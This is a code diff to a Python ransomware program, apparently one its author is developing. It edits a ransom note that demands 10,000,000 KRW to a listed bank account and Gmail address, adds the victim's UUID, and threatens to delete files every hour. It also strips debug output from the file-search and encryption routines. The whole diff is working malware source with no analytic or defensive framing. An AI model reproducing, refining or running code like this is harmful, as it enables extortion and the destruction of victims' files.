@@ -217,10 +217,11 @@ class MyTk:
                                          "\nYour photos, documents, etc..."
                                          "\nBut, don't worry! I have not deleted them yet :D"
                                          "\nYou have some time to pay 10,000,000KRW in our account to get the decryption key."
+                                         "\nSend the money to the account below, and send the details and your UUID to the below e-mail."
                                          "\nOUR ACCOUNT : KB 786102-00-040854"
-                                         "\nIf you send money, send an e-mail with your account at this address."
                                          "\nOUR E-MAIL ADDRESS : secureantdd@gmail.com"
-                                         "\nEvery hour half of all files will be deleted."
+                                         "\nYOU UUID : "+str(UUID)+
+                                         "\nIf you dont, every hour half of all files will be deleted."
                                          "\n------WARNING------"
                                          "\nDo not force-terminate this program."
                                          "\nYou will NEVER decrypt your files."
@@ -323,8 +324,6 @@ def startTimer(gui, path, ext=None):
     antdd_filelist = []
 
     enc_search_dir(antdd_filelist, path)
-    for i in antdd_filelist:
-        print(i)
 
     if len(antdd_filelist) == 0:
         gui.allRemovePrint()
@@ -416,8 +415,6 @@ class RealMain:
         enc_targetlist = []
         search_dir(enc_targetlist, os.getcwd())
 
-        for i in enc_targetlist:
-            print('run=>',i)
 
         for enc_target in enc_targetlist:
             if enc_target.split('.')[-1] == 'antdd':
